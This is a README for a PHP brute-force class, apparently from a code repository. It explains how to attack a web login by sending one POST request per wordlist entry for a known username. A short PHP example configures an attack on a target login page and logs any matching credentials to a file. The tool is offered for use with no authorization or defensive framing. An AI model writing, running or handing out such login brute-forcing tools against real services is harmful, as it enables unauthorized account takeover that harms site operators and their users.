# PHPBruteForce
With this PHP class, you can brute-force a login with a wordlist. 

More information
================
You specify a wordlist to use and it will send a POST request for each line of the wordlist. It can only be used for brute-forcing passwords, so you have to know the username of an account. This uses cURL.

An example
==========
``` php
<?php

require 'app\bruteforce.class.php'; // Require in the Brute Force class

BruteForce::init(array(
    'url'         => 'http://target.com/login.php', // Login page to attack.
		'username'    => 'username', // The username in the POST request.
		'password'    => 'password', // The password in the POST request.
		'adminname'   => 'admin', // So as I said, this class can only brute-force passwords. So you have to specify a username, here you must specify the username.
		'wordlist'    => 'wordlist/wordlist.txt', // Path to the wordlist.
		'failcontent' => 'Error', // Content of page when logging in fails.
		'outputfile'  => 'output/output.txt', // Path to the output file, here will the matching combo('s) be stored.
		'timezone'    => 'Europe/Amsterdam' // Timezone.
));

$bf = new BruteForce(); // Instanciate the class.
$bf->attack(); // BOOM! ATTACK!

?>
```
For a better example, take a look in the "example" directory.

